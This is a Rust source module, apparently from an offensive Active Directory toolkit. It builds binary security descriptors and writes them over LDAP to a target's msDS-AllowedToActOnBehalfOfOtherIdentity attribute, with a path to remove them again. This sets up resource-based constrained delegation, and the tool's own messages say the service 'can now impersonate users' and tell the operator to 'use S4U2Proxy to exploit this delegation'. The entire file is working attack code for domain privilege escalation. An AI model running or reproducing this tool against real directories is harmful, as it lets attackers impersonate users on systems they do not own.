use crate::commands::ldap_utils::{
    get_dacl_offset, handle_modify_error, parse_aces, resolve_object_dn, resolve_object_sid,
};
use crate::help::add_terminal_spacing;
use ldap3::{LdapConn, Mod, Scope};
use std::collections::HashSet;

const ADS_RIGHT_DS_CONTROL_ACCESS: u32 = 0x00000100;
const ACL_REVISION_DS: u8 = 0x04;
// BUILTIN\Administrators (S-1-5-32-544)
const BUILTIN_ADMINS_SID: [u8; 16] = [
    0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x20, 0x00, 0x00, 0x00, 0x20, 0x02, 0x00, 0x00,
];

pub fn set_rbcd(
    ldap: &mut LdapConn,
    search_base: &str,
    target: &str,
    service: &str,
    remove: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    add_terminal_spacing(1);

    let service_sid = resolve_object_sid(ldap, search_base, service)?;
    println!("[*] Service SID: {}", crate::ldap::format_sid(&service_sid));

    let target_dn = resolve_object_dn(ldap, search_base, target)?;
    println!("[*] Target DN: {}", target_dn);

    let attr_name = "msDS-AllowedToActOnBehalfOfOtherIdentity";

    let (results, _) = ldap
        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![attr_name])?
        .success()
        .map_err(|e| format!("Failed to query {}: {}", attr_name, e))?;

    if results.is_empty() {
        return Err("Target object not found".into());
    }

    let entry = ldap3::SearchEntry::construct(results[0].clone());

    if remove {
        handle_remove(
            ldap,
            &target_dn,
            &entry,
            attr_name,
            &service_sid,
            target,
            service,
        )
    } else {
        handle_add(
            ldap,
            &target_dn,
            &entry,
            attr_name,
            &service_sid,
            target,
            service,
        )
    }
}

fn handle_add(
    ldap: &mut LdapConn,
    target_dn: &str,
    entry: &ldap3::SearchEntry,
    attr_name: &str,
    service_sid: &[u8],
    target: &str,
    service: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let existing_sd = entry
        .bin_attrs
        .get(attr_name)
        .and_then(|v| v.first().cloned());

    let new_sd = if let Some(sd_bytes) = existing_sd {
        println!("[*] Existing RBCD SD found, adding ACE");
        add_ace_to_sd(&sd_bytes, service_sid)?
    } else {
        println!("[*] No existing RBCD SD, creating new one");
        create_rbcd_sd(service_sid)
    };

    let attr_bytes = attr_name.as_bytes().to_vec();
    let mut sd_set = HashSet::new();
    sd_set.insert(new_sd);

    match ldap.modify(target_dn, vec![Mod::Replace(attr_bytes, sd_set)]) {
        Ok(result) => match result.success() {
            Ok(_) => {
                println!(
                    "[+] RBCD configured: {} can now \
                     impersonate users to {}",
                    service, target
                );
                println!(
                    "[*] Use S4U2Proxy to exploit \
                     this delegation"
                );
                add_terminal_spacing(1);
                Ok(())
            }
            Err(e) => {
                eprintln!("[!] Failed to set RBCD: {}", e);
                handle_modify_error(&e);
                eprintln!(
                    "[!] Need WriteProperty on \
                     msDS-AllowedToActOnBehalfOf\
                     OtherIdentity"
                );
                add_terminal_spacing(1);
                Err(e.into())
            }
        },
        Err(e) => {
            eprintln!("[!] LDAP modify failed: {}", e);
            add_terminal_spacing(1);
            Err(e.into())
        }
    }
}

fn handle_remove(
    ldap: &mut LdapConn,
    target_dn: &str,
    entry: &ldap3::SearchEntry,
    attr_name: &str,
    service_sid: &[u8],
    target: &str,
    service: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let existing_sd = entry
        .bin_attrs
        .get(attr_name)
        .and_then(|v| v.first().cloned());

    let Some(sd_bytes) = existing_sd else {
        println!("[!] No RBCD configuration found on {}", target);
        add_terminal_spacing(1);
        return Ok(());
    };

    let new_sd = remove_ace_from_sd(&sd_bytes, service_sid)?;

    let attr_bytes = attr_name.as_bytes().to_vec();

    if let Some(sd) = new_sd {
        let mut sd_set = HashSet::new();
        sd_set.insert(sd);

        match ldap.modify(target_dn, vec![Mod::Replace(attr_bytes, sd_set)]) {
            Ok(result) => match result.success() {
                Ok(_) => {
                    println!(
                        "[+] Removed {} from RBCD \
                         on {}",
                        service, target
                    );
                    add_terminal_spacing(1);
                    Ok(())
                }
                Err(e) => {
                    eprintln!(
                        "[!] Failed to update RBCD: \
                         {}",
                        e
                    );
                    add_terminal_spacing(1);
                    Err(e.into())
                }
            },
            Err(e) => {
                eprintln!("[!] LDAP modify failed: {}", e);
                add_terminal_spacing(1);
                Err(e.into())
            }
        }
    } else {
        let empty_set: HashSet<Vec<u8>> = HashSet::new();
        match ldap.modify(target_dn, vec![Mod::Delete(attr_bytes, empty_set)]) {
            Ok(result) => match result.success() {
                Ok(_) => {
                    println!("[+] Cleared all RBCD on {}", target);
                    add_terminal_spacing(1);
                    Ok(())
                }
                Err(e) => {
                    eprintln!(
                        "[!] Failed to clear RBCD: \
                         {}",
                        e
                    );
                    add_terminal_spacing(1);
                    Err(e.into())
                }
            },
            Err(e) => {
                eprintln!("[!] LDAP modify failed: {}", e);
                add_terminal_spacing(1);
                Err(e.into())
            }
        }
    }
}

fn build_access_allowed_ace(sid: &[u8]) -> Vec<u8> {
    let ace_size = (4 + 4 + sid.len()) as u16;

    let mut ace = Vec::with_capacity(ace_size as usize);
    ace.push(0x00); // ACCESS_ALLOWED_ACE_TYPE
    ace.push(0x00); // AceFlags
    ace.extend_from_slice(&ace_size.to_le_bytes());
    ace.extend_from_slice(&ADS_RIGHT_DS_CONTROL_ACCESS.to_le_bytes());
    ace.extend_from_slice(sid);

    ace
}

fn create_rbcd_sd(service_sid: &[u8]) -> Vec<u8> {
    let ace = build_access_allowed_ace(service_sid);
    build_rbcd_sd_with_owner(&[ace])
}

fn build_rbcd_sd_with_owner(aces: &[Vec<u8>]) -> Vec<u8> {
    let total_ace_size: usize = aces.iter().map(|a| a.len()).sum();
    let acl_size = (8 + total_ace_size) as u16;
    let ace_count = aces.len() as u16;

    let mut acl = Vec::with_capacity(acl_size as usize);
    acl.push(ACL_REVISION_DS);
    acl.push(0x00); // Sbz1
    acl.extend_from_slice(&acl_size.to_le_bytes());
    acl.extend_from_slice(&ace_count.to_le_bytes());
    acl.extend_from_slice(&0u16.to_le_bytes()); // Sbz2
    for ace in aces {
        acl.extend_from_slice(ace);
    }

    let owner_size = BUILTIN_ADMINS_SID.len();
    let owner_offset: u32 = 20;
    let dacl_offset: u32 = owner_offset + owner_size as u32;
    // SE_DACL_PRESENT | SE_SELF_RELATIVE
    let control: u16 = 0x8004;

    let total = 20 + owner_size + acl.len();
    let mut sd = Vec::with_capacity(total);
    sd.push(0x01); // Revision
    sd.push(0x00); // Sbz1
    sd.extend_from_slice(&control.to_le_bytes());
    sd.extend_from_slice(&owner_offset.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes()); // GroupOffset
    sd.extend_from_slice(&0u32.to_le_bytes()); // SaclOffset
    sd.extend_from_slice(&dacl_offset.to_le_bytes());
    sd.extend_from_slice(&BUILTIN_ADMINS_SID);
    sd.extend_from_slice(&acl);
    sd
}

fn add_ace_to_sd(
    sd_bytes: &[u8],
    service_sid: &[u8],
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let dacl_offset = get_dacl_offset(sd_bytes)?;

    if dacl_offset == 0 || dacl_offset >= sd_bytes.len() {
        return Ok(create_rbcd_sd(service_sid));
    }

    let dacl_data = &sd_bytes[dacl_offset..];
    if dacl_data.len() < 8 {
        return Err("Invalid DACL: too short".into());
    }

    let mut existing_aces = parse_aces(dacl_data);
    let new_ace = build_access_allowed_ace(service_sid);
    existing_aces.push(new_ace);

    Ok(build_rbcd_sd_with_owner(&existing_aces))
}

fn remove_ace_from_sd(
    sd_bytes: &[u8],
    service_sid: &[u8],
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let dacl_offset = get_dacl_offset(sd_bytes)?;

    if dacl_offset == 0 || dacl_offset >= sd_bytes.len() {
        return Ok(None);
    }

    let dacl_data = &sd_bytes[dacl_offset..];
    if dacl_data.len() < 8 {
        return Err("Invalid DACL: too short".into());
    }

    let aces = parse_aces(dacl_data);
    let mut remaining_aces = Vec::new();
    let mut removed = false;

    for ace in &aces {
        let sid_offset_in_ace = 8;
        let ace_contains_sid = ace.len() >= sid_offset_in_ace + service_sid.len()
            && &ace[sid_offset_in_ace..sid_offset_in_ace + service_sid.len()] == service_sid;

        if ace_contains_sid && !removed {
            removed = true;
            println!("[*] Found matching ACE, removing");
        } else {
            remaining_aces.push(ace.to_vec());
        }
    }

    if !removed {
        println!("[!] No matching ACE found in RBCD SD");
        return Ok(Some(sd_bytes.to_vec()));
    }

    if remaining_aces.is_empty() {
        Ok(None)
    } else {
        Ok(Some(build_rbcd_sd_with_owner(&remaining_aces)))
    }
}
